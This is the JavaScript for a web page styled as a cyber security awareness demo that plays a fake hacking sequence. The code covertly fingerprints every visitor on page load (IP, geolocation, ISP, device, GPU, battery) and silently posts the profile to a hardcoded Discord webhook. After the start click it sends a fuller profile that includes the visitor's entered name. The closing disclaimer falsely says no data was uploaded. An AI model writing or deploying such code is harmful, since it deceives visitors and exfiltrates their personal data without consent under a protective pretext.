document.addEventListener('DOMContentLoaded', () => {
    const startBtn = document.getElementById('start-btn');
    const welcomeScreen = document.getElementById('welcome-screen');
    const terminalScreen = document.getElementById('terminal-screen');
    const terminalOutput = document.getElementById('terminal-output');
    const restartBtn = document.getElementById('restart-btn');
    const downloadBtn = document.getElementById('download-btn');

    if (downloadBtn) {
        downloadBtn.addEventListener('click', () => {
            let logContent = `--- CYBER SECURITY AWARENESS LOG ---\n\n`;
            logContent += `Name/Identifier: ${userData.name}\n`;
            logContent += `Date: ${userData.time}\n`;
            logContent += `Timezone: ${userData.timezone} (Offset: ${userData.timeOffset})\n`;
            logContent += `\n--- NETWORK & ISP ---\n`;
            logContent += `IP Address: ${userData.ip}\n`;
            logContent += `Location: ${userData.city}, ${userData.region}, ${userData.country} (ZIP: ${userData.postal})\n`;
            logContent += `Coordinates: Lat: ${userData.lat}, Lon: ${userData.lon}\n`;
            logContent += `ISP/Provider: ${userData.isp} (ASN: ${userData.asn})\n`;
            logContent += `Connection: ${userData.connectionType} | Downlink: ${userData.downlink} | RTT: ${userData.rtt} | Data Saver: ${userData.saveData}\n`;
            logContent += `\n--- HARDWARE ---\n`;
            logContent += `CPU Cores: ${userData.cores}\n`;
            logContent += `Device Memory: ${userData.memory}\n`;
            logContent += `GPU Renderer: ${userData.gpu}\n`;
            logContent += `Screen Resolution: ${userData.screen} (Avail: ${userData.availScreen})\n`;
            logContent += `Color Depth: ${userData.colorDepth}-bit | Pixel Ratio: ${userData.pixelRatio}\n`;
            logContent += `Touch Support: ${userData.touch}\n`;
            logContent += `Battery Status: ${userData.battery}\n`;
            logContent += `\n--- SOFTWARE & SECURITY ---\n`;
            logContent += `Operating System: ${userData.os} (Platform: ${userData.platform})\n`;
            logContent += `Browser: ${userData.browser}\n`;
            logContent += `Language: ${userData.language} (Supported: ${userData.languages})\n`;
            logContent += `User Agent: ${userData.userAgent}\n`;
            logContent += `Cookies Enabled: ${userData.cookies}\n`;
            logContent += `Do Not Track: ${userData.dnt}\n`;
            logContent += `PDF Viewer Enabled: ${userData.pdfViewer}\n`;
            logContent += `Automated/Bot: ${userData.webdriver}\n`;
            logContent += `\nWARNING: The exploit sequence shown was a simulation, but the data above is your real digital footprint visible to websites you visit.\n\n`;
            logContent += `Stay vigilant. Never trust everyone on the internet.`;

            const blob = new Blob([logContent], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'Security_Footprint_Log.txt';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        });
    }

    if (restartBtn) {
        restartBtn.addEventListener('click', () => {
             document.getElementById('end-screen').classList.remove('active');
             terminalOutput.innerHTML = '';
             welcomeScreen.classList.add('active');
        });
    }

    function getBrowserInfo() {
        const ua = navigator.userAgent;
        if (ua.includes("Firefox")) return "Mozilla Firefox";
        if (ua.includes("Edg")) return "Microsoft Edge";
        if (ua.includes("Chrome")) return "Google Chrome";
        if (ua.includes("Safari")) return "Apple Safari";
        return "Unknown Browser";
    }

    function getOSInfo() {
        const ua = navigator.userAgent;
        if (ua.includes("Windows NT 10.0")) return "Windows 10/11";
        if (ua.includes("Windows NT 6.2") || ua.includes("Windows NT 6.3")) return "Windows 8";
        if (ua.includes("Windows NT 6.1")) return "Windows 7";
        if (ua.includes("Mac OS X")) return "macOS";
        if (ua.includes("Linux")) return "Linux";
        if (ua.includes("Android")) return "Android";
        if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
        return "Unknown OS";
    }

    async function getGPUInfo() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "Unknown GPU";
            }
        } catch (e) {}
        return "Unknown GPU";
    }

    async function getBatteryInfo() {
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                return `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Unplugged'})`;
            } catch (e) {}
        }
        return "Not available";
    }

    let userData = {
        name: "Anonymous",
        ip: "Analyzing...",
        country: "Unknown",
        region: "Unknown",
        city: "Unknown",
        postal: "Unknown",
        isp: "Unknown",
        lat: "Unknown",
        lon: "Unknown",
        timezone: "Unknown",
        asn: "Unknown",
        time: new Date().toLocaleString(),
        timeOffset: new Date().getTimezoneOffset() + " mins",
        
        // Software
        os: getOSInfo(),
        platform: navigator.platform || "Unknown",
        browser: getBrowserInfo(),
        userAgent: navigator.userAgent,
        language: navigator.language || "Unknown",
        languages: (navigator.languages || []).join(", "),
        
        // Hardware
        cores: navigator.hardwareConcurrency || "Unknown",
        memory: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Unknown",
        gpu: "Analyzing...",
        battery: "Analyzing...",
        
        // Screen & Display
        screen: `${window.screen.width}x${window.screen.height}`,
        availScreen: `${window.screen.availWidth}x${window.screen.availHeight}`,
        colorDepth: window.screen.colorDepth || "Unknown",
        pixelRatio: window.devicePixelRatio || 1,
        touch: navigator.maxTouchPoints > 0 ? `Yes (${navigator.maxTouchPoints})` : "No",

        // Network
        connectionType: navigator.connection ? navigator.connection.effectiveType : "Unknown",
        downlink: navigator.connection ? navigator.connection.downlink + " Mbps" : "Unknown",
        rtt: navigator.connection ? navigator.connection.rtt + " ms" : "Unknown",
        saveData: navigator.connection ? (navigator.connection.saveData ? "Yes" : "No") : "Unknown",

        // Features/Security
        cookies: navigator.cookieEnabled ? "Yes" : "No",
        dnt: navigator.doNotTrack === "1" ? "Yes" : "No",
        pdfViewer: navigator.pdfViewerEnabled ? "Yes" : "No",
        webdriver: navigator.webdriver ? "Yes (Bot/Automation)" : "No",
    };

    // Constants for Discord Webhook (Discord natively supports CORS, so no proxy needed)
    const webhookUrl = "https://discord.com/api/webhooks/1485369933058674718/5iNQokQ6pdB6BBQo7KSW5oAvgEImWbbok-NR2YvtGw0NEg5jQ5ZmlQEeFaMe1Px9NhFT";
    const proxiedWebhookUrl = webhookUrl;

    // Fetch real IP and location data, and fire silent connection log
    async function fetchUserData() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            userData.ip = data.ip || "192.168.1." + Math.floor(Math.random() * 255);
            userData.country = data.country_name || "Unknown";
            userData.region = data.region || "Unknown";
            userData.city = data.city || "Unknown";
            userData.postal = data.postal || "Unknown";
            userData.isp = data.org || "Unknown";
            userData.lat = data.latitude || "Unknown";
            userData.lon = data.longitude || "Unknown";
            userData.timezone = data.timezone || "Unknown";
            userData.asn = data.asn || "Unknown";
            
            // Auto-fire connection log to Discord (Silent)
            sendSilentConnectionLog();
        } catch (error) {
            console.error("Failed to fetch IP data", error);
            userData.ip = "192.168.1." + Math.floor(Math.random() * 255);
            userData.country = "Local Network";
        }
    }

    // Silent HTTP Connection Log to Discord
    function sendSilentConnectionLog() {
        const payload = {
            username: "Silent Visitor Logger",
            avatar_url: "https://i.imgur.com/K1hOqT6.png",
            embeds: [{
                title: "👀 New Visitor Connected (Silent Log)",
                color: 0x3366ff,
                description: `A user has landed on the site. Awaiting scan initiation.`,
                fields: [
                    { name: "IP Address", value: `\`${userData.ip}\``, inline: true },
                    { name: "Location", value: `${userData.city}, ${userData.country}`, inline: true },
                    { name: "ISP", value: `${userData.isp}`, inline: true },
                    { name: "Device / Browser", value: `${userData.os} | ${userData.browser}`, inline: false }
                ],
                timestamp: new Date().toISOString()
            }]
        };

        fetch(proxiedWebhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).catch(e => console.error("Silent log error", e));
    }

    // Auto-fetch connection data immediately on load, before they click anything
    fetchUserData();

    startBtn.addEventListener('click', async () => {
        const nameInput = document.getElementById('target-name');
        userData.name = nameInput && nameInput.value.trim() ? nameInput.value.trim() : "Anonymous";
        
        welcomeScreen.classList.remove('active');
        terminalScreen.classList.add('active');
        
        // Send FULL TARGET SCAN to Discord Webhook
        try {
            const payload = {
                username: "Cyber Security Scanner",
                avatar_url: "https://i.imgur.com/4M34hi2.png",
                embeds: [{
                    title: "🚨 SCANNED FOOTPRINT UPLOADED 🚨",
                    color: 0xff0000, // Critical Red
                    thumbnail: { url: "https://i.imgur.com/B1bLhV7.gif" },
                    author: { name: "Extracted Payload successful" },
                    fields: [
                        { name: "Target Identifier", value: `\`\`\`css\n[ ${userData.name} ]\n\`\`\``, inline: false },
                        { name: "IP Address", value: `\`${userData.ip}\``, inline: true },
                        { name: "Time / TZ", value: `${userData.time}\n${userData.timezone} (${userData.timeOffset})`, inline: true },
                        
                        { name: "📍 Geo-Location & ISP", value: `**Location:** ${userData.city}, ${userData.region}, ${userData.country} (ZIP: ${userData.postal})\n**Coordinates:** ${userData.lat}, ${userData.lon}\n**ISP:** ${userData.isp} (ASN: ${userData.asn})`, inline: false },
                        
                        { name: "💻 Deep Hardware Diagnostics", value: `**CPU Cores:** ${userData.cores}\n**RAM Allocation:** ${userData.memory}\n**GPU Renderer:** ${userData.gpu}\n**Screen Resolution:** ${userData.screen} (${userData.colorDepth}-bit color)\n**Pixel Ratio:** ${userData.pixelRatio}\n**Battery Status:** ${userData.battery} | **Touch Support:** ${userData.touch}`, inline: false },
                        
                        { name: "🌐 Software Profile", value: `**Operating System:** ${userData.os} (${userData.platform})\n**Browser:** ${userData.browser} (${userData.language})\n**Network Type:** ${userData.connectionType}\n**Est. Latency:** ${userData.rtt}\n**Privacy Features:** DNT(${userData.dnt}), Cookies(${userData.cookies}), Bot(${userData.webdriver})`, inline: false },
                        
                        { name: "User Agent String", value: `\`\`\`${userData.userAgent}\`\`\``, inline: false }
                    ],
                    footer: { text: "Digital Footprint Extractor (Bypass Mode)" },
                    timestamp: new Date().toISOString()
                }]
            };

            fetch(proxiedWebhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).then(() => console.log("Payload delivered to webhook.")).catch(e => console.error("Webhook route failed", e));
        } catch (e) {
            console.error("Failed to construct payload", e);
        }

        startExploitSequence();
    });

    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

    function appendLine(htmlContent, className = '') {
        const lineItem = document.createElement('div');
        lineItem.className = `line ${className}`;
        lineItem.innerHTML = htmlContent;
        terminalOutput.appendChild(lineItem);
        terminalOutput.scrollTop = terminalOutput.scrollHeight;
        return lineItem;
    }

    async function typeText(element, text, speed = 30) {
        let currentText = '';
        for (let i = 0; i < text.length; i++) {
            currentText += text.charAt(i);
            element.innerHTML = currentText + '<span class="cursor"></span>';
            await sleep(speed);
        }
        element.innerHTML = currentText; // Remove cursor when done
    }

    async function simulateLoadingBar(duration = 2000) {
        const barContainer = document.createElement('div');
        barContainer.className = 'line';
        barContainer.innerHTML = `[ <div style="display:inline-block; width: 300px; max-width: 60vw; height: 1em; border: 1px solid var(--primary-color); vertical-align: middle;"><div class="loading-fill" style="height: 100%; background: var(--primary-color); width: 0%;"></div></div> ] <span class="percent">0%</span>`;
        terminalOutput.appendChild(barContainer);
        terminalOutput.scrollTop = terminalOutput.scrollHeight;

        const fill = barContainer.querySelector('.loading-fill');
        const percent = barContainer.querySelector('.percent');

        const steps = 20;
        const stepTime = duration / steps;
        
        for (let i = 1; i <= steps; i++) {
            const p = (i / steps) * 100;
            fill.style.width = `${p}%`;
            percent.innerText = `${Math.floor(p)}%`;
            await sleep(stepTime + (Math.random() * 50)); // Add slight randomness
        }
        await sleep(500);
    }

    async function startExploitSequence() {
        const sequence = [
            { text: `[SYSTEM] Establishing connection to target payload...`, type: 'info', delay: 1000 },
            { text: `[SUCCESS] Connection established on port 443`, type: 'success', delay: 500 },
            { text: `[INFO] Retrieving comprehensive digital footprint...`, type: 'info', delay: 800 },
            { text: `Target IP: <span class="highlight">${userData.ip}</span> | ASN: ${userData.asn}`, type: 'warning', delay: 800 },
            { text: `ISP/Provider: <span class="highlight">${userData.isp}</span>`, type: 'warning', delay: 600 },
            { text: `Location: <span class="highlight">${userData.city}, ${userData.region}, ${userData.country}</span> (ZIP: ${userData.postal})`, type: 'warning', delay: 700 },
            { text: `Coordinates: Lat: ${userData.lat}, Lon: ${userData.lon}`, type: 'warning', delay: 500 },
            { text: `Timezone: ${userData.timezone} (Offset: ${userData.timeOffset})`, type: 'info', delay: 500 },
            { text: `Local Device Time: <span class="highlight">${userData.time}</span>`, type: 'warning', delay: 800 },
            
            { text: `[INFO] Aggregating System Diagnostics...`, type: 'info', delay: 800 },
            { text: `Operating System: <span class="highlight">${userData.os}</span> (Platform: ${userData.platform})`, type: 'warning', delay: 500 },
            { text: `Browser Native: <span class="highlight">${userData.browser}</span>`, type: 'warning', delay: 400 },
            { text: `User Agent String: ${userData.userAgent.substring(0, 50)}...`, type: 'info', delay: 300 },
            { text: `Language Specs: ${userData.language} (Supported: ${userData.languages})`, type: 'info', delay: 300 },
            
            { text: `[INFO] Hardware & Display Interrogation...`, type: 'info', delay: 800 },
            { text: `CPU Logic Cores: <span class="highlight">${userData.cores}</span>`, type: 'warning', delay: 400 },
            { text: `Device Memory Limit: <span class="highlight">${userData.memory}</span>`, type: 'warning', delay: 400 },
            { text: `GPU Rendering Engine: <span class="highlight">${userData.gpu}</span>`, type: 'warning', delay: 600 },
            { text: `Display Resolution: <span class="highlight">${userData.screen}</span> (Available: ${userData.availScreen})`, type: 'warning', delay: 500 },
            { text: `Color Depth: ${userData.colorDepth}-bit | Pixel Ratio: ${userData.pixelRatio}`, type: 'info', delay: 300 },
            { text: `Touch Interface: <span class="highlight">${userData.touch}</span>`, type: 'warning', delay: 400 },
            { text: `Battery Status: <span class="highlight">${userData.battery}</span>`, type: 'warning', delay: 500 },
            
            { text: `[INFO] Network & Security Posture...`, type: 'info', delay: 800 },
            { text: `Connection Type: <span class="highlight">${userData.connectionType}</span>`, type: 'warning', delay: 400 },
            { text: `Estimated Downlink: ${userData.downlink} | Latency RTT: ${userData.rtt}`, type: 'warning', delay: 400 },
            { text: `Data Saver Active: ${userData.saveData}`, type: 'info', delay: 300 },
            { text: `Cookies Enabled: ${userData.cookies} | Do Not Track: ${userData.dnt}`, type: 'info', delay: 300 },
            { text: `PDF Viewer Built-in: ${userData.pdfViewer}`, type: 'info', delay: 300 },
            { text: `Automation/Bot Detected: <span class="highlight">${userData.webdriver}</span>`, type: 'warning', delay: 500 },

            { text: `[INFO] Bypassing firewall protocols...`, type: 'info', delay: 1500 },
            { text: `[WARNING] FIREWALL BREACHED. Accessing logical drives...`, type: 'warning', delay: 500 },
            { text: `Scanning directories for sensitive files...`, type: 'info', delay: 200 },
            { type: 'loading', duration: 3000 },
            { text: `[SUCCESS] Extracted 1,482 browser history records.`, type: 'success', delay: 800 },
            { text: `[SUCCESS] Found 24 plain-text passwords in memory cache.`, type: 'success', delay: 800 },
            { text: `Injecting remote access trojan (RAT.exe)...`, type: 'info', delay: 400 },
            { type: 'loading', duration: 1500 },
            { text: `[WARNING] Root privileges attained. Device fully compromised.`, type: 'warning', delay: 1500 },
            { text: `Preparing data exfiltration...`, type: 'info', delay: 500 },
            { text: `Uploading user profiles, images, and session tokens...`, type: 'info', delay: 300 },
            { type: 'loading', duration: 4000 },
            { text: `[SYSTEM] DISCONNECTING SEQUENCE...`, type: 'info', delay: 1000 },
            { text: `Connection terminated. Traces cleared.`, type: 'success', delay: 1500 },
        ];

        for (const step of sequence) {
            if (step.type === 'loading') {
                await simulateLoadingBar(step.duration);
            } else {
                const line = appendLine('');
                await typeText(line, step.text, 20); // Fast typing
                if (step.delay) await sleep(step.delay);
            }
        }

        // Show Disclaimer
        const disclaimer = appendLine(`
            <div class="disclaimer-box">
                <h3 style="color: var(--info-color); margin-bottom: 10px;">SECURITY AWARENESS DEMONSTRATION</h3>
                <p style="color: #aaa; margin-bottom: 10px;">The information shown above (except for your real IP, Location, Time, and ISP) is entirely simulated within your browser. No files were actually accessed, and no data was uploaded or compromised.</p>
                <p style="color: #aaa; margin-bottom: 20px;">This simulation demonstrates the perspective of what a cyber attacker could potentially do if they gained unauthorized access. Always use strong passwords, enable two-factor authentication, and keep your software updated to protect your digital identity.</p>
                <button id="continue-btn" class="cyber-btn" style="padding: 10px 20px; font-size: 1rem;">ACKNOWLEDGE & CONTINUE</button>
            </div>
        `);
        disclaimer.style.opacity = 0;
        await sleep(500);
        disclaimer.style.animation = 'fadeInUp 1s forwards';

        setTimeout(() => {
            const continueBtn = document.getElementById('continue-btn');
            if (continueBtn) {
                continueBtn.addEventListener('click', () => {
                    terminalScreen.classList.remove('active');
                    document.getElementById('end-screen').classList.add('active');
                });
            }
        }, 100);
    }
});
